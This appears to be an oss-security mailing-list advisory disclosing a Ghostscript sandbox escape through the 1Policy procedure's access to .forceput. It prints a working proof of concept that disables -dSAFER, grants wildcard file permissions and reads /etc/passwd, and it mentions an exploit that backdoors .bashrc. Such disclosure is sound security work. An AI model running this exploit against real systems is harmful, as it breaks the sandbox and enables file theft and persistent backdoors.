  oss-security - ghostscript: 1Policy operator gives access to .forceput            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [thread-next>] [day] [month] [year] [list]  Date: Tue, 16 Oct From: Tavis Ormandy <taviso@...gle.com> To: oss-security@...ts.openwall.com Subject: ghostscript: 1Policy operator gives access to .forceput  Hello, this is another ghostscript sandbox escape. Because procedures in postscript are just executable arrays, all system procedures need to be marked as executeonly, so that users cannot peek at their internals with array operators.  We have also recently learned that they must be marked as pseudo-operators, otherwise their contents might leak to error handlers.  That makes sense, unless the procedure itself is dangerous - in that case it must be hidden.  1Policy is a procedure that was correctly marked as executeonly and made a pseudo-operator, but was basically just a wrapper around .forceput. Here is how to exploit it:  /.forceput { <<>> <<>> 4 index (ignored) 5 index 5 index .policyprocs 1 get exec pop pop pop pop pop pop pop } def  Once you have access to .forceput, you can basically do whatever you want, see the exploit for a full example of backdooring .bashrc.  Here is a simpler repro, just reading /etc/passwd:  $ gs -dSAFER -sDEVICE=ppmraw GPL Ghostscript Copyright (C) Artifex Software, Inc.  All rights reserved. This software comes with NO WARRANTY: see the file PUBLIC for details. GS>/.forceput { <<>> <<>> 4 index (ignored) 5 index 5 index .policyprocs 1 get exec pop pop pop pop pop pop pop } def GS>systemdict /SAFER false .forceput GS>systemdict /userparams get /PermitFileControl [(*)] .forceput GS>systemdict /userparams get /PermitFileWriting [(*)] .forceput GS>systemdict /userparams get /PermitFileReading [(*)] .forceput GS>(/etc/passwd) (r) file string readline pop == (root:x:0:0:root:/root:/bin/bash) GS>  This patch solves it:   Side note: I'm done looking at ghostscript for now, but still *strongly* recommend that we deprecate untrusted postscript and disable ghostscript coders by default in policy.xml.  Thanks, Tavis.   Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      